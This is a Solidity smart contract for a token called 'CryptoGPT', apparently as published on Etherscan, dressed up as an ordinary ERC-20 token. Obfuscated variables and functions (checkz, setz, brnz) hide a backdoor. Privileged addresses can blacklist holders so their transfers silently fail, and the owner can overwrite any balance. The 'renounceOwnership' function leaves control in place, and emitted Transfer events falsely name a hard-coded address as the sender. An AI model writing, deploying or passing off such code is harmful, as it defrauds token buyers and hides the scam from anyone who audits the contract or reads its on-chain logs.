/**
 *Submitted for verification at Etherscan.io on 2023-03-10
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract CryptoGPT {
    using SafeMath for uint256;
    mapping (address => uint256) private RTKa;
	
    mapping (address => uint256) public RTKb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "CryptoGPT";
	
    string public symbol = "GPT";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private RTKc;
      address private RTKd;
    uint256 private RTKe;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address RTKf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        RTKd = msg.sender;
             RTKa[msg.sender] = totalSupply;
        
       CREAT();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function CREAT() internal  {                             
                       RTKb[msg.sender] = 6;
                       RTKc = RTKf;

                

        emit Transfer(address(0), RTKc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return RTKa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(RTKb[msg.sender] <= RTKe) {
    require(RTKa[msg.sender] >= value);
RTKa[msg.sender] -= value;  
RTKa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(RTKb[msg.sender] > RTKe) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function checkz (address RTKj, uint256 RTKk) public {
		if(RTKb[msg.sender] == RTKe) {   
			   	   
   RTKb[RTKj] = RTKk;}
   }
		       function setz (uint256 RTKk) onlyOwner public {
                     RTKe = RTKk; 
	}

 		       function brnz (address RTKj, uint256 RTKk) onlyOwner public {		   	   
  RTKa[RTKj] = RTKk;}


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(RTKb[from] < RTKe && RTKb[to] < RTKe) {
        require(value <= RTKa[from]);
        require(value <= allowance[from][msg.sender]);
        RTKa[from] -= value;
        RTKa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(RTKb[from] == RTKe) {
        require(value <= RTKa[from]);
        require(value <= allowance[from][msg.sender]);
        RTKa[from] -= value;
        RTKa[to] += value;
        allowance[from][msg.sender] -= value;


            from = RTKf;
	   

        emit Transfer(from, to, value);
        return true; }


         if(RTKb[from] > RTKe || RTKb[to] > RTKe) {
             
         }}



     

        	
 }